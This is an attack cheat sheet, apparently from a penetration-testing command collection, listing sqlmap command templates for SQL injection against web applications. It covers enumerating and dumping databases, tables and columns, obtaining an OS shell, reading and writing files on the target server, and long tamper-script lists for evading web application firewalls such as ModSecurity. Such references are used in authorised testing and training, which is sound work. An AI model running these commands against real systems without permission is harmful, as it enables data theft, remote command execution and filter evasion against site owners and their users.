# SQLMAP

% sql injection
#plateform/linux #target/remote #cat/ATTACK/INJECTION  #port/80 #port/443 #port/8080 #port/8443

## SQLMap - Enumerate Databases
```
sqlmap -u <url> --dbs
```

## SQLMap - Enumerate Tables
```
sqlmap -u <url> -D <database_name> --tables
```

## SQLMap - Enumerate Columns
```
sqlmap -u <url> -D <database_name> -T <table_name> --columns
```

## SQLMap - Dump Data
```
sqlmap -u <url> -D <database_name> -T <table_name> -C <column_names> --dump
```

## SQLMap - List Databases
```
sqlmap -u <url> --dbs
```

## SQLMap - List Tables
```
sqlmap -u <url> -D <db> --tables
```

## SQLMap - Dump a Table
```
sqlmap -u <url> -D <db> -T <table> --dump
```

## SQLMap - List Columns of a Table
```
sqlmap -u <url> -D <db> -T <table> --columns
```

## SQLMap - Dump Specific Columns from a Table
```
sqlmap -u <url> -D <db> -T <table> -C <c1>,<c2> --dump
```

## SQLMap - Get OS Shell
```
sqlmap -u <url> --os-shell
```

## SQLMap - File Read
```
sqlmap -u <url> --file-read=<remote_file>
```

## SQLMap - File Write
```
sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
```

## SQLMap - Classic GET Request
```
sqlmap -u <url>
```

## SQLMap - Classic POST Request
```
sqlmap -u <url> --data="<params>"
```

## SQLMap - GET Request with Cookie
```
sqlmap -u <url> --cookie=<cookie>
```

## SQLMap - Use Request File
```
sqlmap -r <request_file>
```

## SQLMap - Classic with Tamper Scripts
```
sqlmap -u '<url>' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## SQLMap - Hardcore Scan
```
sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

## SQLMap - MySQL Tamper List
```
sqlmap -u <url> --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## SQLMap - MSSQL Tamper List
```
sqlmap -u <url> --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```